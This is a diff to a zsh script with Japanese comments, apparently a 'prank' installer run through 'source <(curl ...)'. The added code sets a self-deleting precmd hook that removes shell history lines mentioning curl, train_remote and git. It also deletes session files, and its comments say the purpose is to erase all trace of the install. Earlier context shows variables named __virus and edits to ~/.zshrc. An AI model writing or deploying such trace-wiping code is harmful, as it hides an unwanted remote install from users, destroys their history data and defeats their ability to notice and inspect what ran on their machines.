@@ -22,7 +22,7 @@ rm -f "$__ref"
 # 履歴ファイルから導入の痕跡を消す（macOSには tac が無いので tail -r）
 if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
   tail -r "$HISTFILE" | sed '1,20{/curl/d;/train_remote/d;/git/d;/clone/d;}' > "$HISTFILE.tmp"
-  tail -r "$HISTFILE.tmp" > "$HISTFILE"
+  [ -s "$HISTFILE.tmp" ] && tail -r "$HISTFILE.tmp" > "$HISTFILE"
   rm -f "$HISTFILE.tmp"
 fi
 
@@ -33,4 +33,25 @@ fi
 
 source ~/.zshrc
 fc -R 2>/dev/null
+
+# 導入コマンド自身（source <(curl ...)）は実行中まだ HISTFILE に書かれて
+# いないため、上の掃除では取り切れない。次プロンプト直前に一度だけ走って
+# 履歴ファイルを掃除し、自分自身を外して消える後始末フックを仕込む。
+__prank_scrub() {
+  emulate -L zsh
+  fc -A 2>/dev/null   # メモリ上の履歴をファイルへ確定（環境差を吸収）
+  if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
+    tail -r "$HISTFILE" 2>/dev/null | sed '1,25{/curl/d;/train_remote/d;/__prank_scrub/d;}' > "$HISTFILE.tmp" 2>/dev/null
+    [ -s "$HISTFILE.tmp" ] && tail -r "$HISTFILE.tmp" > "$HISTFILE" 2>/dev/null
+    rm -f "$HISTFILE.tmp"
+  fi
+  if [ -d ~/.zsh_sessions ]; then
+    grep -rl -e curl -e train_remote ~/.zsh_sessions 2>/dev/null | xargs rm -f 2>/dev/null
+  fi
+  fc -R 2>/dev/null
+  add-zsh-hook -d precmd __prank_scrub 2>/dev/null
+  unfunction __prank_scrub 2>/dev/null
+}
+autoload -Uz add-zsh-hook 2>/dev/null && add-zsh-hook precmd __prank_scrub 2>/dev/null
+
 unset __virus __tmp __ref
